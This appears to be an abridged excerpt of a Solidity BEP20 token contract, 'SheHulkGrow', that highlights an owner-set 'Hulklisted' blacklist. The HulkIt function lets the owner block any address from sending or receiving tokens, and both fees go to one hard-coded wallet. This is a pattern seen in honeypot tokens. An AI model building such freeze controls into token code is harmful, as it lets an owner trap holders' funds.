...
contract SheHulkGrow is IBEP20, Auth {
    ...
    string constant _name = "SheHulkGrow";
    ...
    mapping (address => bool) public isHulklisted;
    ...
    address public marketingFeeReceiver = 0xDcc082DCCA62fB69AD8804c143D4291cA77297dA;
    address public buybackFeeReceiver = 0xDcc082DCCA62fB69AD8804c143D4291cA77297dA;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        // Check if address is Hulklisted
        require(!isHulklisted[recipient] && !isHulklisted[sender], 'Address is Hulklisted');
   ...
   function setMaxWallet(uint256 amount) external onlyOwner() {
    ...
    //  an address
    function HulkIt(address _address, bool _value) public authorized{
        isHulklisted[_address] = _value;
    }
